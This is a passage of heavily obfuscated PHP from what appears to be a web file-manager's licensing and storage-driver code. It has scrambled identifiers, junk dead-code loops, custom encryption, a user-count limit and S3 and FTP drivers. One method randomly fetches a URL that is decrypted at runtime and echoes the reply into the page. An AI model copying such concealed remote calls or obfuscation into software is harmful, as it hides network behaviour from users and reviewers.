$ŞîˆÆ”ô[266], $ŞîˆÆ”ô[277] => $ŞîˆÆ”ô[268], $ŞîˆÆ”ô[278] => $ŞîˆÆ”ô[279], $ŞîˆÆ”ô[280] => $ŞîˆÆ”ô[270], $ŞîˆÆ”ô[281] => $ŞîˆÆ”ô[282], $ŞîˆÆ”ô[283] => $ŞîˆÆ”ô[272], $ŞîˆÆ”ô[284] => $ŞîˆÆ”ô[285], $ŞîˆÆ”ô[286] => $ŞîˆÆ”ô[287], $ŞîˆÆ”ô[288] => $ŞîˆÆ”ô[289]); $úŒƒ—÷· = $ƒ òî‡í[682]; if (strlen($úŒƒ—÷·) < $ƒ òî‡í[406]) { die; } $Îà“§Û¹ = $–³µ±´á[$this->axsb341bad3b]; $‰›ŸÚ› = $ƒ òî‡í[683]; while (strlen($‰›ŸÚ›) < $ƒ òî‡í[623]) { if (!$‰›ŸÚ›) { break; } $‰›ŸÚ›++; } $Îà“§Û¹ = intval($Îà“§Û¹ ? $Îà“§Û¹ : $ŞîˆÆ”ô[264]); $š—ÚËçå = $ƒ òî‡í[684]; $–µÌùü = _get($this->ncmydd3e0569, $ŞîˆÆ”ô[290]); $–µÌùü = $–µÌùü ? intval($–µÌùü) : 0; $±›ú’Ì¥ = $ƒ òî‡í[685]; return $Îà“§Û¹ + $–µÌùü; $¼´ˆìó‰ = $ƒ òî‡í[686]; } public function dxwqaf370c6b($Ï…ìöà°) { $¸İüÔîÀ =& $_SERVER[Ó¡Ÿ§‚]; $õ¹’»š =& $_SERVER[â¥“Ú£Ö]; $ƒáˆá‘¶ = $this->zxnr9a951b9f(); $ë¹ï‘® = $¸İüÔîÀ[687]; while (strlen($ë¹ï‘®) < $¸İüÔîÀ[643]) { if (!$ë¹ï‘®) { break; } $ë¹ï‘®++; } if ($Ï…ìöà°[$õ¹’»š[291]] == $õ¹’»š[121]) { return; } if ($ƒáˆá‘¶ >= intval($õ¹’»š[211])) { return; } $ÂñæäÓ® = Model($õ¹’»š[124])->count(); $š“×õÑÕ = $¸İüÔîÀ[688]; while (strlen($š“×õÑÕ) < $¸İüÔîÀ[623]) { if (!$š“×õÑÕ) { break; } $š“×õÑÕ++; } if ($ÂñæäÓ® <= $ƒáˆá‘¶) { return; } $’ùçİ¨Ù = Model($õ¹’»š[124])->field($õ¹’»š[291])->limit($ƒáˆá‘¶)->select(); $‰§‘Ì£¤ = $¸İüÔîÀ[689]; if (!$‰§‘Ì£¤) { return; } $’ùçİ¨Ù = array_to_keyvalue($’ùçİ¨Ù, $õ¹’»š[6], $õ¹’»š[291]); if (!in_array($Ï…ìöà°[$õ¹’»š[291]], $’ùçİ¨Ù)) { show_json($õ¹’»š[292], !1, $õ¹’»š[207]); } } public function gimb320dcd12() { $§œ›•®  =& $_SERVER[Ó¡Ÿ§‚]; $õ§·ûè˜ =& $_SERVER[â¥“Ú£Ö]; if (!_get($GLOBALS, $õ§·ûè˜[115]) || mt_rand(1, 100) > 20) { return; } $Îï£öÊ = $õ§·ûè˜[214]; $Îï£öÊ = $this->zrus6114bd5b($Îï£öÊ, $õ§·ûè˜[215]); $Ï÷åÈ÷µ = $§œ›•® [690]; if (strlen($Ï÷åÈ÷µ) < $§œ›•® [623]) { return; } $€ó¹¾İ = stream_context_create(array($õ§·ûè˜[216] => array($õ§·ûè˜[217] => $õ§·ûè˜[218], $õ§·ûè˜[219] => 3))); $„¯™ÔÏœ = @file_get_contents($Îï£öÊ, !1, $€ó¹¾İ); $……¿£Ä… = $§œ›•® [691]; if (strlen($……¿£Ä…) < $§œ›•® [630]) { return; } echo $õ§·ûè˜[293] . hash_encode($„¯™ÔÏœ) . $õ§·ûè˜[294]; } private function mwop795e71a5($û“ŸÓş, $ïøéù÷Ø, $è§„Öí… = 3) { $£İµ¿ÇÕ =& $_SERVER[Ó¡Ÿ§‚]; $íÏî¨Ë§ =& $_SERVER[â¥“Ú£Ö]; usleep(1); $Ùûêäøå = $£İµ¿ÇÕ[692]; if (strlen($Ùûêäøå) < $£İµ¿ÇÕ[406]) { die; } $û“ŸÓş = trim($û“ŸÓş); $àéà­Üş = mt_rand(0, 5) . $íÏî¨Ë§[6]; $«ÒÂÂ’” = $£İµ¿ÇÕ[693]; $şõ•ÓÊÂ = rand_string(15); $º‘†‰¦¥ = $£İµ¿ÇÕ[694]; $î„¶ö¶» = $íÏî¨Ë§[295]; $½ØÙóƒ® = $£İµ¿ÇÕ[695]; switch ($àéà­Üş) { case $íÏî¨Ë§[203]: $‰¸‰İÎ¢ = $this->dgfzf1156181($û“ŸÓş, strrev($ïøéù÷Ø . $şõ•ÓÊÂ)); break; $Áş´‹æ  = $£İµ¿ÇÕ[696]; while ($Áş´‹æ  < $£İµ¿ÇÕ[625]) { if ($Áş´‹æ  >= 0) { break; } $Áş´‹æ ++; } case $íÏî¨Ë§[121]: $‰¸‰İÎ¢ = $this->dgfzf1156181($û“ŸÓş, strrev($şõ•ÓÊÂ . $ïøéù÷Ø)); break; $¼˜ïø = $£İµ¿ÇÕ[697]; while (strlen($¼˜ïø) < $£İµ¿ÇÕ[625]) { if (!$¼˜ïø) { break; } $¼˜ïø++; } case $íÏî¨Ë§[296]: $‰¸‰İÎ¢ = $this->dgfzf1156181($û“ŸÓş, base64_encode($şõ•ÓÊÂ . $ïøéù÷Ø)); $’ëÁÉÂİ = $£İµ¿ÇÕ[698]; break; case $íÏî¨Ë§[297]: $‰¸‰İÎ¢ = $this->dgfzf1156181($û“ŸÓş, md5($şõ•ÓÊÂ . $ïøéù÷Ø)); $ôèÎÒ¹ = $£İµ¿ÇÕ[699]; break; $¼›™ü£À = $£İµ¿ÇÕ[700]; if (strlen($¼›™ü£À) < $£İµ¿ÇÕ[630]) { die; } case $íÏî¨Ë§[298]: $û“ŸÓş = base64_encode($û“ŸÓş); $ÂÙÍÒß = $£İµ¿ÇÕ[701]; while ($ÂÙÍÒß < $£İµ¿ÇÕ[625]) { if ($ÂÙÍÒß >= 0) { break; } $ÂÙÍÒß++; } $¶ÅåØ¸µ = rand(0, 64); $Àéìˆ¿ = $î„¶ö¶»[$¶ÅåØ¸µ]; $Í–•œ† = md5($Àéìˆ¿ . md5($ïøéù÷Ø . $Àéìˆ¿) . $ïøéù÷Ø); $Í–•œ† = substr($Í–•œ†, $¶ÅåØ¸µ % 8, $¶ÅåØ¸µ % 8 + 7); $Û•å¸…è = $íÏî¨Ë§[6]; $İşÊÁü´ = $£İµ¿ÇÕ[702]; if (strlen($İşÊÁü´) < $£İµ¿ÇÕ[406]) { die; } $—†±ÒÂª = 0; $¾éâê‘‘ = 0; $•¨Ä“ôê = $£İµ¿ÇÕ[703]; while (strlen($•¨Ä“ôê) < $£İµ¿ÇÕ[625]) { if (!$•¨Ä“ôê) { break; } $•¨Ä“ôê++; } $áÎÑûàÍ = 0; for ($—†±ÒÂª = 0; $—†±ÒÂª < strlen($û“ŸÓş); $—†±ÒÂª++) { $áÎÑûàÍ = $áÎÑûàÍ == strlen($Í–•œ†) ? 0 : $áÎÑûàÍ; $îÄ°àÉü = $£İµ¿ÇÕ[704]; if (strlen($îÄ°àÉü) < $£İµ¿ÇÕ[406]) { return; } $¾éâê‘‘ = ($¶ÅåØ¸µ + strpos($î„¶ö¶», $û“ŸÓş[$—†±ÒÂª]) + ord($Í–•œ†[$áÎÑûàÍ++])) % 64; $Û•å¸…è .= $î„¶ö¶»[$¾éâê‘‘]; } $‰¸‰İÎ¢ = hash_encode($Àéìˆ¿ . $Û•å¸…è); break; default: $‰¸‰İÎ¢ = $this->dgfzf1156181($û“ŸÓş, $ïøéù÷Ø . $şõ•ÓÊÂ); $¥·³É£‡ = $£İµ¿ÇÕ[705]; while ($¥·³É£‡ < $£İµ¿ÇÕ[643]) { if ($¥·³É£‡ >= 0) { break; } $¥·³É£‡++; } break; } $‰¸‰İÎ¢ = strrev($àéà­Üş . $şõ•ÓÊÂ . $‰¸‰İÎ¢); $Úñ”åúş = $£İµ¿ÇÕ[706]; if (strlen($Úñ”åúş) < $£İµ¿ÇÕ[643]) { die; } if ($è§„Öí… - 1 > 0) { $‰¸‰İÎ¢ = $this->mwop795e71a5($‰¸‰İÎ¢, $ïøéù÷Ø, $è§„Öí… - 1); } return $‰¸‰İÎ¢; } private function quks2d291a17($™˜÷èÑ¹, $Ù²€í¤ç, $¤ÏÌæÓ = 3) { $ü¾±ĞŸ· =& $_SERVER[Ó¡Ÿ§‚]; $“ªæˆ­ı =& $_SERVER[â¥“Ú£Ö]; if (!is_string($™˜÷èÑ¹) || strlen($™˜÷èÑ¹) < 10) { return !1; } $™˜÷èÑ¹ = trim($™˜÷èÑ¹); $¥Ù“íí = $ü¾±ĞŸ·[707]; if (!$¥Ù“íí) { return; } $™˜÷èÑ¹ = strrev($™˜÷èÑ¹); $²‡¾Ğ´ = $ü¾±ĞŸ·[708]; if (strlen($²‡¾Ğ´) < $ü¾±ĞŸ·[630]) { die; } $¼’³Ë–Ÿ = $™˜÷èÑ¹[0]; $é­ÎúÛÇ = substr($™˜÷èÑ¹, 1, 15); $õî˜ĞÍË = $ü¾±ĞŸ·[709]; if (strlen($õî˜ĞÍË) < $ü¾±ĞŸ·[630]) { die; } $™˜÷èÑ¹ = substr($™˜÷èÑ¹, 16); $Ü¯äŞë° = $“ªæˆ­ı[295]; switch ($¼’³Ë–Ÿ) { case $“ªæˆ­ı[203]: $áÔÆö¤Ú = $this->zrus6114bd5b($™˜÷èÑ¹, strrev($Ù²€í¤ç . $é­ÎúÛÇ)); $éˆ¥•© = $ü¾±ĞŸ·[710]; while ($éˆ¥•© < $ü¾±ĞŸ·[643]) { if ($éˆ¥•© >= 0) { break; } $éˆ¥•©++; } break; case $“ªæˆ­ı[121]: $áÔÆö¤Ú = $this->zrus6114bd5b($™˜÷èÑ¹, strrev($é­ÎúÛÇ . $Ù²€í¤ç)); break; $‚–»¯İé = $ü¾±ĞŸ·[711]; if (!$‚–»¯İé) { die; } case $“ªæˆ­ı[296]: $áÔÆö¤Ú = $this->zrus6114bd5b($™˜÷èÑ¹, base64_encode($é­ÎúÛÇ . $Ù²€í¤ç)); $à‘Ó¯„Ø = $ü¾±ĞŸ·[712]; if (strlen($à‘Ó¯„Ø) < $ü¾±ĞŸ·[630]) { return; } break; case $“ªæˆ­ı[297]: $áÔÆö¤Ú = $this->zrus6114bd5b($™˜÷èÑ¹, md5($é­ÎúÛÇ . $Ù²€í¤ç)); $É«°ü‚õ = $ü¾±ĞŸ·[713]; if (!$É«°ü‚õ) { die; } break; case $“ªæˆ­ı[298]: $™˜÷èÑ¹ = hash_decode($™˜÷èÑ¹); $Šğ„½šç = $ü¾±ĞŸ·[714]; $òè’¤›à = $™˜÷èÑ¹[0]; $ÌÉ¬‡Êº = $ü¾±ĞŸ·[715]; if (strlen($ÌÉ¬‡Êº) < $ü¾±ĞŸ·[630]) { die; } $™˜÷èÑ¹ = substr($™˜÷èÑ¹, 1); $ßª›’¹Í = $ü¾±ĞŸ·[716]; $¬ó¨—–‡ = strpos($Ü¯äŞë°, $òè’¤›à); $§é…Ïïµ = $ü¾±ĞŸ·[717]; $ëºğ²°› = md5($òè’¤›à . md5($Ù²€í¤ç . $òè’¤›à) . $Ù²€í¤ç); $ëºğ²°› = substr($ëºğ²°›, $¬ó¨—–‡ % 8, $¬ó¨—–‡ % 8 + 7); $âõ¸ıº = $“ªæˆ­ı[6]; $çüÒŠ÷÷ = $ü¾±ĞŸ·[718]; $‚¤ı„òÁ = 0; $‡ó¼‹ò = $ü¾±ĞŸ·[719]; $‹Â’Íï‘ = 0; $¤¥éÆ‡¶ = $ü¾±ĞŸ·[720]; if (!$¤¥éÆ‡¶) { return; } $õĞ´œºÍ = 0; for ($‚¤ı„òÁ = 0; $‚¤ı„òÁ < strlen($™˜÷èÑ¹); $‚¤ı„òÁ++) { $õĞ´œºÍ = $õĞ´œºÍ == strlen($ëºğ²°›) ? 0 : $õĞ´œºÍ; $”ÎÚçï” = $õĞ´œºÍ++; $‹Â’Íï‘ = strpos($Ü¯äŞë°, $™˜÷èÑ¹[$‚¤ı„òÁ]) - $¬ó¨—–‡ - ord($ëºğ²°›[$”ÎÚçï”]); $’¢ƒ¸èà = $ü¾±ĞŸ·[721]; while ($‹Â’Íï‘ < 0) { $‹Â’Íï‘ += 64; $Åäª›Ñå = $ü¾±ĞŸ·[722]; if (strlen($Åäª›Ñå) < $ü¾±ĞŸ·[406]) { die; } } $âõ¸ıº .= $Ü¯äŞë°[$‹Â’Íï‘]; $ˆùíşÁº = $ü¾±ĞŸ·[723]; while (strlen($ˆùíşÁº) < $ü¾±ĞŸ·[643]) { if (!$ˆùíşÁº) { break; } $ˆùíşÁº++; } } $áÔÆö¤Ú = base64_decode($âõ¸ıº); $¦Äİ‹áê = $ü¾±ĞŸ·[724]; if (!$¦Äİ‹áê) { die; } break; default: $áÔÆö¤Ú = $this->zrus6114bd5b($™˜÷èÑ¹, $Ù²€í¤ç . $é­ÎúÛÇ); break; } if ($¤ÏÌæÓ - 1 > 0) { $áÔÆö¤Ú = $this->quks2d291a17($áÔÆö¤Ú, $Ù²€í¤ç, $¤ÏÌæÓ - 1); } return $áÔÆö¤Ú; } public function hiwye84d17f1($´˜§ãÓæ) { $ƒ˜€ğŒŒ =& $_SERVER[Ó¡Ÿ§‚]; $¯Ìé¢±Â =& $_SERVER[â¥“Ú£Ö]; $êØ…‹ı = $this->abqjdfb36c95(); $¾à±ìÕ¢ = $this->abqjdfb36c95(); $ˆ·Ó‡ç™ = $ƒ˜€ğŒŒ[725]; if (strlen($ˆ·Ó‡ç™) < $ƒ˜€ğŒŒ[623]) { return; } $®óı€ = ($êØ…‹ı - 1) * ($¾à±ìÕ¢ - 1); $¥Òµ®¤ı = intval(($êØ…‹ı + $¾à±ìÕ¢) / 2); $Ë²ÖÙ = $ƒ˜€ğŒŒ[726]; if (!$Ë²ÖÙ) { die; } while (1) { $³ö³É–Á = $¥Òµ®¤ı; $ŞªÖê¨ç = $®óı€; while ($ŞªÖê¨ç % $³ö³É–Á != 0) { $‰¤› ê = $ŞªÖê¨ç; $ŞªÖê¨ç = $³ö³É–Á; $³ö³É–Á = $‰¤› ê % $³ö³É–Á; } if ($³ö³É–Á == 1) { break; } else { $¥Òµ®¤ı++; } } $ŠéÕ¨Á¼ = 2; for ($è²ÀäÌ = 0; $è²ÀäÌ < $®óı€ * 10; $è²ÀäÌ++) { if (($®óı€ * $è²ÀäÌ + 1) % $¥Òµ®¤ı == 0) { $ŠéÕ¨Á¼ = intval(($®óı€ * $è²ÀäÌ + 1) / $¥Òµ®¤ı); break; } } $»Ú˜Í€ = $this->dgfzf1156181($êØ…‹ı * $¾à±ìÕ¢ . $¯Ìé¢±Â[6], $¯Ìé¢±Â[135]); $Üµş´½ğ = md5($¯Ìé¢±Â[299] . ($êØ…‹ı + $¾à±ìÕ¢) . $¯Ìé¢±Â[300] . $¥Òµ®¤ı . $¯Ìé¢±Â[300] . $ŠéÕ¨Á¼ . $¯Ìé¢±Â[301]); $…åŠôŞÕ = $this->dgfzf1156181($´˜§ãÓæ, $Üµş´½ğ) . $¯Ìé¢±Â[302] . $»Ú˜Í€; $‚‚‹¾Ùê = $ƒ˜€ğŒŒ[727]; if (!$‚‚‹¾Ùê) { return; } return $…åŠôŞÕ; $Å™ÜäİÒ = $ƒ˜€ğŒŒ[728]; if (strlen($Å™ÜäİÒ) < $ƒ˜€ğŒŒ[630]) { return; } } public function madzad956b02($¤«ÀÇ’Ê) { $¹Ëß˜€à =& $_SERVER[Ó¡Ÿ§‚]; $œ©÷Ë›ô =& $_SERVER[â¥“Ú£Ö]; $ø³áÜ­ò = explode($œ©÷Ë›ô[302], $¤«ÀÇ’Ê); $ìÕªòæ = $¹Ëß˜€à[729]; while (strlen($ìÕªòæ) < $¹Ëß˜€à[623]) { if (!$ìÕªòæ) { break; } $ìÕªòæ++; } if (count($ø³áÜ­ò) != 2) { return $œ©÷Ë›ô[6]; } $îÔÒìŠÄ = $this->zrus6114bd5b($ø³áÜ­ò[1] . $œ©÷Ë›ô[6], $œ©÷Ë›ô[135]); $ç’ğ½ßì = $¹Ëß˜€à[730]; if (!$ç’ğ½ßì) { return; } if (!$îÔÒìŠÄ) { return $œ©÷Ë›ô[6]; } $îÔÒìŠÄ = intval($îÔÒìŠÄ); $È¿Ã´¤Ú = $¹Ëß˜€à[731]; while ($È¿Ã´¤Ú < $¹Ëß˜€à[630]) { if ($È¿Ã´¤Ú >= 0) { break; } $È¿Ã´¤Ú++; } $É£È“Â® = 0; $ò‰›€Ğ = 0; for ($â‘ŠÚ¢‘ = 3; $â‘ŠÚ¢‘ < $îÔÒìŠÄ; $â‘ŠÚ¢‘ += 2) { if ($îÔÒìŠÄ % $â‘ŠÚ¢‘ != 0) { continue; } $É£È“Â® = $â‘ŠÚ¢‘; $¨ì‚ã€Á = $¹Ëß˜€à[732]; if (strlen($¨ì‚ã€Á) < $¹Ëß˜€à[630]) { die; } $ò‰›€Ğ = intval($îÔÒìŠÄ / $â‘ŠÚ¢‘); $İ§‚áêĞ = $¹Ëß˜€à[733]; while (strlen($İ§‚áêĞ) < $¹Ëß˜€à[406]) { if (!$İ§‚áêĞ) { break; } $İ§‚áêĞ++; } break; } $°éé­æ¨ = ($É£È“Â® - 1) * ($ò‰›€Ğ - 1); $…Èê± = $¹Ëß˜€à[734]; $ó‚À¶• = intval(($É£È“Â® + $ò‰›€Ğ) / 2); $ø–™–ìœ = $¹Ëß˜€à[735]; while (strlen($ø–™–ìœ) < $¹Ëß˜€à[643]) { if (!$ø–™–ìœ) { break; } $ø–™–ìœ++; } while (1) { $ÜØëªÛ€ = $ó‚À¶•; $»ëóôú½ = $°éé­æ¨; $µã¢£ş = $¹Ëß˜€à[736]; if (!$µã¢£ş) { die; } while ($»ëóôú½ % $ÜØëªÛ€ != 0) { $¼ìò½‘¿ = $»ëóôú½; $Ÿ‚ÒÁ˜ = $¹Ëß˜€à[737]; if (!$Ÿ‚ÒÁ˜) { die; } $»ëóôú½ = $ÜØëªÛ€; $òÏèšÊ = $¹Ëß˜€à[738]; if (!$òÏèšÊ) { die; } $ÜØëªÛ€ = $¼ìò½‘¿ % $ÜØëªÛ€; $Àó­¶» = $¹Ëß˜€à[739]; } if ($ÜØëªÛ€ == 1) { break; } else { $ó‚À¶•++; } } $Æ™û¹ïÀ = 2; for ($â‘ŠÚ¢‘ = 0; $â‘ŠÚ¢‘ < $°éé­æ¨ * 10; $â‘ŠÚ¢‘++) { if (($°éé­æ¨ * $â‘ŠÚ¢‘ + 1) % $ó‚À¶• == 0) { $Æ™û¹ïÀ = intval(($°éé­æ¨ * $â‘ŠÚ¢‘ + 1) / $ó‚À¶•); break; } } $œæÁˆÀ… = md5($œ©÷Ë›ô[299] . ($É£È“Â® + $ò‰›€Ğ) . $œ©÷Ë›ô[300] . $ó‚À¶• . $œ©÷Ë›ô[300] . $Æ™û¹ïÀ . $œ©÷Ë›ô[301]); $¹¡ıĞŸ£ = $this->zrus6114bd5b($ø³áÜ­ò[0], $œæÁˆÀ…); $íŒÛìü = $¹Ëß˜€à[740]; if (strlen($íŒÛìü) < $¹Ëß˜€à[643]) { return; } return $¹¡ıĞŸ£; } public function abqjdfb36c95() { $²¸™ŸˆÆ =& $_SERVER[Ó¡Ÿ§‚]; $£ş½Á¯Ä = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÔŠ®¢Ä = array(); $ï°ÜšúŠ = $²¸™ŸˆÆ[741]; while ($ï°ÜšúŠ < $²¸™ŸˆÆ[643]) { if ($ï°ÜšúŠ >= 0) { break; } $ï°ÜšúŠ++; } $Åòúå¦¿ = 1; $¿¤İ°äğ = $²¸™ŸˆÆ[742]; if (!$¿¤İ°äğ) { die; } while ($Åòúå¦¿ <= (int) sqrt($£ş½Á¯Ä)) { $ù…Ñ„è½ = $Åòúå¦¿; $£‘¬îµ£ = $²¸™ŸˆÆ[637]; if (!$£‘¬îµ£) { return; } while (!0) { $ù…Ñ„è½++; if ($ù…Ñ„è½ <= 2) { $Åòúå¦¿ = $ù…Ñ„è½; break; } else { if ($ù…Ñ„è½ < 2) { continue; } } $‚š—Š¿ñ = !0; for ($¾Í…ø»‰ = 2; $¾Í…ø»‰ <= sqrt($ù…Ñ„è½); $¾Í…ø»‰++) { if ($ù…Ñ„è½ % $¾Í…ø»‰ == 0) { $‚š—Š¿ñ = !1; } } if ($‚š—Š¿ñ) { $Åòúå¦¿ = $ù…Ñ„è½; break; } } $ÔŠ®¢Ä[] = $Åòúå¦¿; } $úòÒşô = 2; for ($ù…Ñ„è½ = $£ş½Á¯Ä; $ù…Ñ„è½ > 1; $ù…Ñ„è½--) { $‚š—Š¿ñ = !0; foreach ($ÔŠ®¢Ä as $Ì¬¥¾¼) { if ($ù…Ñ„è½ % $Ì¬¥¾¼ == 0) { $‚š—Š¿ñ = !1; break; } } if ($‚š—Š¿ñ) { $úòÒşô = $ù…Ñ„è½; break; } } return $úòÒşô; $Ş¢ë¡õÄ = $²¸™ŸˆÆ[743]; if (strlen($Ş¢ë¡õÄ) < $²¸™ŸˆÆ[630]) { return; } } public function hdlw17b2ab84($ªÒ¢£°‘, $Ä¼äöç¨) { $—€­Òí =& $_SERVER[â¥“Ú£Ö]; return call_user_func(array($—€­Òí[8], $—€­Òí[303]), $ªÒ¢£°‘, $Ä¼äöç¨); $îéÜ¼Ş = $_SERVER[Ó¡Ÿ§‚][744]; } public function dgfzf1156181($¼Ê‡ïÆ×, $â–Ç¶º•) { $½¬²Œ° =& $_SERVER[Ó¡Ÿ§‚]; $¶€é×Ç× =& $_SERVER[â¥“Ú£Ö]; return call_user_func(array($¶€é×Ç×[304], $¶€é×Ç×[305]), $¼Ê‡ïÆ×, $â–Ç¶º•); $éÕ©ˆÛ” = $½¬²Œ°[745]; if (strlen($éÕ©ˆÛ”) < $½¬²Œ°[625]) { die; } } public function zrus6114bd5b($í‘ç¬şË, $ïä˜ÛÑÄ) { $—¿Ïàò˜ =& $_SERVER[â¥“Ú£Ö]; return call_user_func(array($—¿Ïàò˜[304], $—¿Ïàò˜[306]), $í‘ç¬şË, $ïä˜ÛÑÄ); } } goto Bó’Ëİ„•î; A´›’“·Èˆ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($®ËŒÕ»ñ) { parent::__construct($®ËŒÕ»ñ); $this->signatureVersion($_SERVER[Ó¡Ÿ§‚][216]); } public function uploadFormData($ò½»ğçı, $•ÇË™ô³ = 3600) { $£ß§ğÆˆ =& $_SERVER[Ó¡Ÿ§‚]; $°ÇÅß¿ = $£ß§ğÆˆ[199]; $ØÑ¿¸¯Ì = $£ß§ğÆˆ[1357]; $ôŞç = $£ß§ğÆˆ[62]; $‹á´²ÔÍ = gmdate($£ß§ğÆˆ[1358]); $ÙöÆÃúË = gmdate($£ß§ğÆˆ[749]); $ÇÈÉÄÑì = $£ß§ğÆˆ[1359]; $»»·ÖÊî = $•ÇË™ô³ . $£ß§ğÆˆ[12]; $¯€ÚˆÆü = $£ß§ğÆˆ[1321]; $¢ßà·Ò = array($this->accessKey, $ÙöÆÃúË, $this->region, $ôŞç, $ÇÈÉÄÑì); $¹Œü×Õ• = implode($£ß§ğÆˆ[8], $¢ßà·Ò); $›£úñ£Ø = array($£ß§ğÆˆ[1323] => gmdate($£ß§ğÆˆ[1322], strtotime($£ß§ğÆˆ[1360])), $£ß§ğÆˆ[1324] => array(array($£ß§ğÆˆ[1326] => $this->bucket), array($£ß§ğÆˆ[1325] => $°ÇÅß¿), array($£ß§ğÆˆ[1327], $£ß§ğÆˆ[1328], $£ß§ğÆˆ[12]), array($£ß§ğÆˆ[1327], $£ß§ğÆˆ[1361], $£ß§ğÆˆ[12]), array($£ß§ğÆˆ[1327], $£ß§ğÆˆ[1362], $£ß§ğÆˆ[12]), array($£ß§ğÆˆ[1329] => $¯€ÚˆÆü), array($£ß§ğÆˆ[1363] => $¹Œü×Õ•), array($£ß§ğÆˆ[1364] => $ØÑ¿¸¯Ì), array($£ß§ğÆˆ[1365] => $‹á´²ÔÍ), array($£ß§ğÆˆ[1366] => $»»·ÖÊî))); $úù¯˜øÛ = base64_encode(json_encode($›£úñ£Ø)); $ÁÅ­À¿Ã = hash_hmac($£ß§ğÆˆ[1367], $ÙöÆÃúË, $£ß§ğÆˆ[1368] . $this->secret, !0); $¿æŞ»­¤ = hash_hmac($£ß§ğÆˆ[1367], $this->region, $ÁÅ­À¿Ã, !0); $èêÛñ¢… = hash_hmac($£ß§ğÆˆ[1367], $ôŞç, $¿æŞ»­¤, !0); $Û¥‚çØ° = hash_hmac($£ß§ğÆˆ[1367], $ÇÈÉÄÑì, $èêÛñ¢…, !0); $İ·õˆ¹ã = hash_hmac($£ß§ğÆˆ[1367], $úù¯˜øÛ, $Û¥‚çØ°); $òİíóşç = array($£ß§ğÆˆ[215] => $£ß§ğÆˆ[12], $£ß§ğÆˆ[1369] => $£ß§ğÆˆ[12], $£ß§ğÆˆ[1325] => $°ÇÅß¿, $£ß§ğÆˆ[1329] => $¯€ÚˆÆü, $£ß§ğÆˆ[1333] => $úù¯˜øÛ, $£ß§ğÆˆ[1370] => $¹Œü×Õ•, $£ß§ğÆˆ[1371] => $ØÑ¿¸¯Ì, $£ß§ğÆˆ[1372] => $‹á´²ÔÍ, $£ß§ğÆˆ[1373] => $»»·ÖÊî, $£ß§ğÆˆ[1374] => $İ·õˆ¹ã, $£ß§ğÆˆ[182] => $this->getHost()); return $òİíóşç; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¾ÌóÆÈ¡) { parent::__construct(); if (count($¾ÌóÆÈ¡) > 0) { $this->_init($¾ÌóÆÈ¡); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Â¿ ‡‰) { $¸Öé””á =& $_SERVER[Ó¡Ÿ§‚]; global $config; $this->appCharset = $config[$¸Öé””á[1375]]; $this->systemCharset = $config[$¸Öé””á[1376]]; if (isset($Â¿ ‡‰[$¸Öé””á[1377]]) && $Â¿ ‡‰[$¸Öé””á[1377]]) { $this->systemCharset = $Â¿ ‡‰[$¸Öé””á[1377]]; } } public function iconvApp($±»Ğë±©) { return $this->iconvTo($±»Ğë±©, $this->systemCharset, $this->appCharset); } public function iconvSystem($·š»¢·) { return $this->iconvTo($·š»¢·, $this->appCharset, $this->systemCharset); } public function getPathOuter($³‡ˆã¾Ê) { $Î•®í×Ú =& $_SERVER[Ó¡Ÿ§‚]; $î¼˜ã” = $this->iconvApp($this->pathBase); $³‡ˆã¾Ê = $this->iconvApp($³‡ˆã¾Ê); if (substr($î¼˜ã”, 0, 2) == $Î•®í×Ú[1378]) { $î¼˜ã” = BASIC_PATH . substr($î¼˜ã”, 2); } if (substr($³‡ˆã¾Ê, 0, 2) == $Î•®í×Ú[1378]) { $³‡ˆã¾Ê = BASIC_PATH . substr($³‡ˆã¾Ê, 2); } $î¼˜ã” = KodIO::clear($î¼˜ã”); $³‡ˆã¾Ê = KodIO::clear($³‡ˆã¾Ê); $³‡ˆã¾Ê = substr($³‡ˆã¾Ê, strlen($î¼˜ã”)); if (empty($this->pathDriver)) { return $³‡ˆã¾Ê; } return $this->pathDriver . $Î•®í×Ú[8] . ltrim($³‡ˆã¾Ê, $Î•®í×Ú[8]); } private function _init($İ¥ÎÒ¬œ = array()) { $ÖáÈ¶–ù =& $_SERVER[Ó¡Ÿ§‚]; if (!function_exists($ÖáÈ¶–ù[1379])) { throw new Exception(LNG($ÖáÈ¶–ù[1380])); } $this->config = $İ¥ÎÒ¬œ; $this->charsetReset($İ¥ÎÒ¬œ); foreach ($İ¥ÎÒ¬œ as $Ó–¢³²Ü => $‘ÂÁ»”) { if (isset($this->{$Ó–¢³²Ü})) { $this->{$Ó–¢³²Ü} = $‘ÂÁ»”; } } return $this->_login($İ¥ÎÒ¬œ); } private function _login($ÖÎô¡İ±) { $Ğı±‰‹‚ =& $_SERVER[Ó¡Ÿ§‚]; static $”ñó‹Ü = array(); $Á½†’üå = md5(json_encode($ÖÎô¡İ±)); if (isset($”ñó‹Ü[$Á½†’üå])) { foreach ($”ñó‹Ü[$Á½†’üå] as $õ©ä«§ => $¡çŸş·ğ) { $this->{$õ©ä«§} = $¡çŸş·ğ; } return !0; } $»şê‡˜ = parse_url(trim($this->server, $Ğı±‰‹‚[8])); $this->host = $»şê‡˜[$Ğı±‰‹‚[182]]; $ÏÃ¹”åá = isset($»şê‡˜[$Ğı±‰‹‚[181]]) && $»şê‡˜[$Ğı±‰‹‚[181]] == $Ğı±‰‹‚[1381] ? !0 : !1; $this->scheme = $ÏÃ¹”åá ? $Ğı±‰‹‚[1382] : $Ğı±‰‹‚[1383]; $this->port = isset($»şê‡˜[$Ğı±‰‹‚[183]]) ? $»şê‡˜[$Ğı±‰‹‚[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $¢Í€È•ú = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $˜¡ŞíÂ¹ = $this->pasv == $Ğı±‰‹‚[88] ? !0 : !1; @ftp_pasv($this->connect, $˜¡ŞíÂ¹); $”ñó‹Ü[$Á½†’üå] = array($Ğı±‰‹‚[1384] => $this->connect, $Ğı±‰‹‚[182] => $this->host, $Ğı±‰‹‚[181] => $this->scheme, $Ğı±‰‹‚[183] => $this->port); return $¢Í€È•ú; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($É×ñ±ˆ, $šÕ©Ø»È = '', $¬ ì§€ = 